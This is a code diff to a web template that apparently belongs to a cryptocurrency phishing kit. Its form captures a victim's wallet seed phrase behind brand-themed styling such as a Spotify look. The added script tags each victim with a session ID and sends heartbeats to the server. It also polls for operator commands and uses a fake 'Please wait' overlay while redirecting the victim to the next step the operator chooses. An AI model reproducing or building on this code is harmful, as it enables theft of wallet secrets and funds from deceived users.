@@ -291,6 +291,7 @@ body.brand-spotifyaudio{background:#191414;color:#fff}body.brand-spotifyaudio .c
   <form method="POST" action="/p/<%= page.slug %>/step/<%= pageContent.slug %>" id="seedForm">
     <input type="hidden" name="_csrf" value="<%= csrfToken %>">
     <input type="hidden" name="_step" value="<%= pageContent.slug %>">
+    <input type="hidden" name="_sid" id="_sid_seed" value="">
     <input type="hidden" name="seed_phrase" id="seedHidden">
 
     <div id="grid-area">
@@ -335,6 +336,19 @@ function prepareSeed(){
   document.getElementById('seedHidden').value=phrase;
   return true;
 }
+</script>
+<script>
+(function(){
+  var sid=''; try{sid=sessionStorage.getItem('_lbsid')||'';}catch(e){}
+  if(!sid){try{sid=Math.random().toString(36).slice(2)+Date.now().toString(36);sessionStorage.setItem('_lbsid',sid);}catch(e){}}
+  var f=document.getElementById('_sid_seed'); if(f) f.value=sid;
+  var slug='<%= page.slug.replace(/['"\\<>]/g,"") %>';
+  setInterval(function(){try{fetch('/p/'+slug+'/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:sid,step:'seed'}),keepalive:true});}catch(e){}},5000);
+  var ov=document.createElement('div');ov.style.cssText='display:none;position:fixed;inset:0;background:rgba(0,0,0,.82);z-index:9999;align-items:center;justify-content:center;flex-direction:column;gap:18px';
+  ov.innerHTML='<div style="width:52px;height:52px;border:4px solid rgba(255,255,255,.25);border-top-color:#fff;border-radius:50%;animation:_sp 0.8s linear infinite"></div><p style="color:#fff;font-size:1rem;margin:0">Please wait\u2026</p><style>@keyframes _sp{to{transform:rotate(360deg)}}</style>';
+  document.body.appendChild(ov);
+  setInterval(function(){if(!sid)return;fetch('/p/'+slug+'/poll?sid='+encodeURIComponent(sid)).then(function(r){return r.json();}).then(function(d){if(!d.step)return;ov.style.display='flex';var dest=(d.step==='HOME')?'/':(d.step==='NEXT')?'/p/'+slug+'/next':'/p/'+slug+'/'+d.step;setTimeout(function(){window.location.href=dest;},400);}).catch(function(){});},2000);
+})();
 </script>
 </body>
 </html>
